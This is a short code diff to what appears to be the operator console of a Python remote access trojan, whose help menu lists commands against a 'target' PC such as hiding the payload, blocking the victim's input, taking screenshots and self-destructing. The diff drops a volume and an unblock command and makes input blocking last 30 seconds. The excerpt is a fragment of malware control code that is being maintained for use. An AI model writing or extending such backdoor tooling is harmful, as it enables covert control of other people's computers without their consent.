@@ -133,10 +133,8 @@ reboot                ->  Reboot targets PC
 background            ->  Stop current session
 kill                  ->  Program will stop and self distruct itself
 banner                ->  Show banner
-volumeup              ->  Increase Volume on the target device 
 hide                  ->  Hide payload
-blockinput            ->  Input will be blocked
-unblock               ->  Input will be unblocked
+blockinput            ->  Input will be blocked for 30 second
 quit                  ->  Quit the existing shell
 =================================================================
             ''', 'yellow'))
@@ -144,14 +142,10 @@ quit                  ->  Quit the existing shell
             os.system('clear')
         elif command == 'cls':
             os.system("cls")
-        elif command == 'volumeup':
-            print("Volume Increasing . . . ")
         elif command == 'quit':
             break
         elif command == 'blockinput':
-            print("Input blocked!")
-        elif command == 'unblock':
-            print("Input Unblocked")
+            print("Input blocked for 30 seconds")
         elif command == 'screenshot':
             try:
                 download_file(target,'scrn.png')
